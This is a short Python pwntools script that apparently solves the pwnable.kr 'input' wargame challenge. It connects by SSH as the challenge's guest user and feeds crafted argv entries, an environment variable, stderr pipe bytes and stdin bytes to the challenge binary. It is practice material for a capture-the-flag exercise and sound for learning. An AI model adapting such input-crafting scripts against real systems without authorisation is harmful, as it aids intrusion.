from pwn import *

r = ssh('input2', 'pwnable.kr', 2222, 'guest')
payload = []
payload.append('./input')
r1,w1 = os.pipe()
for i in range(99):
    if i == 64:
        payload += [b'\x00']
    elif i == 65:
        payload += [b'\x20\x0a\x0d']
    else: 
        payload += [b'a']
print(payload)
os.write(w1,b'\x00\x0a\x02\xff')
fd = r.process(payload,env={'\xde\xad\xbe\xef' :'\xca\xfe\xba\xbe'}, stderr=r1)
fd.sendline(b'\x00\x0a\x00\xff')

print(fd.recvall())
